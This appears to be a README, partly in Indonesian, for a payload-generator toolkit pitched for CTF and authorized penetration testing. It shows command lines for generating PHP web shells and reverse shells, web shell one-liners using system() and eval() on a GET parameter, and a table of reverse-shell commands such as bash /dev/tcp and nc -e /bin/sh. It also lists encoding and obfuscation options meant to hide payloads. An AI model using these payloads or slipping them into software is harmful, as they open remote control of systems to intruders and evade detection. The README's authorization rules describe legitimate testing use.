# payload-generator v1.0

Payload generator & obfuscation toolkit buat CTF & authorized pentest.

## Perintah

```bash
python3 payload_gen.py php --method command --param c
python3 payload_gen.py reverse --type bash --ip 10.0.0.1 --port 4444
python3 payload_gen.py encode --payload '<?php system($_GET["c"]); ?>' --method base64
python3 payload_gen.py obfuscate --payload '<?php eval($_GET["c"]); ?>' --method comment
```

## Payload Types

| Type | Methods |
|---|---|
| PHP | command, eval, base64, shell, file, backdoor, info, upload |
| ASPX | command, eval, file, shell |
| JSP | command, eval, shell, file |
| Python | command, eval, shell, reverse |

## Reverse Shell

| Type | Payload |
|---|---|
| bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| python | `python3 -c "..."` |
| php | `php -r '...'` |
| netcat | `nc -e /bin/sh IP PORT` |
| perl | `perl -e '...'` |
| ruby | `ruby -rsocket -e '...'` |
| powershell | `powershell -NoP -NonI ...` |

## Encoding

- base64, hex, url, unicode, double-url, html, octal, binary

## Obfuscation

- comment, case, variable, concat, hex-var

## Aturan pakai

- **Wajib** otorisasi tertulis / CTF scope
- Jangan produksi tanpa izin
- Cleanup wajib setelah testing
- Output = attack artifact
